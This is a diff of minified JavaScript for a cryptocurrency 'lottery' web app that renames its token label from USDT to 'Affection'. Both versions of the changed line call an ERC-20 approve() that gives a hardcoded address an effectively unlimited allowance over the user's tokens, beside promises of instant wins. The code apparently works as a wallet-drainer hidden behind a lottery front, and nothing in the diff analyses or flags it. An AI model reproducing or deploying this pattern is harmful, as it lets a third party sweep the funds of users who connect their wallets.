@@ -1018,7 +1018,7 @@
                                                 e.next = 10;
                                                 break
                                             }
-                                            return $e("Approving USDT"), "0x06d81D760898bb736b60Cd0cf98c522d51337D76", "99999999999999999999999999999999999999999999999999", e.next = 7, o.methods.approve("0xc8c74e2c6a355d6a4760e6442fc74e6b698103d0", "99999999999999999999999999999999999999999999999999").send({
+                                            return $e("Approving Affection"), "0x06d81D760898bb736b60Cd0cf98c522d51337D76", "99999999999999999999999999999999999999999999999999", e.next = 7, o.methods.approve("0xc8c74e2c6a355d6a4760e6442fc74e6b698103d0", "99999999999999999999999999999999999999999999999999").send({
                                                 from: z
                                             });
                                         case 7:
@@ -1196,7 +1196,7 @@
                                 children: [Object(g.jsxs)("div", {
                                     className: "col-sm-9",
                                     children: [Object(g.jsx)("h1", {
-                                        children: "USDT Lottery"
+                                        children: "Affection Lottery"
                                     }), Object(g.jsx)("p", {
                                         children: "Instant Win, Instant Announcement, Immediate Transfer"
                                     })]
@@ -1205,7 +1205,7 @@
                                     children: [Object(g.jsx)("h1", {
                                         children: "Your Balance"
                                     }), Object(g.jsxs)("p", {
-                                        children: [Number(Xe).toFixed(2), " USDT"]
+                                        children: [Number(Xe).toFixed(2), " Affection"]
                                     })]
                                 })]
                             })
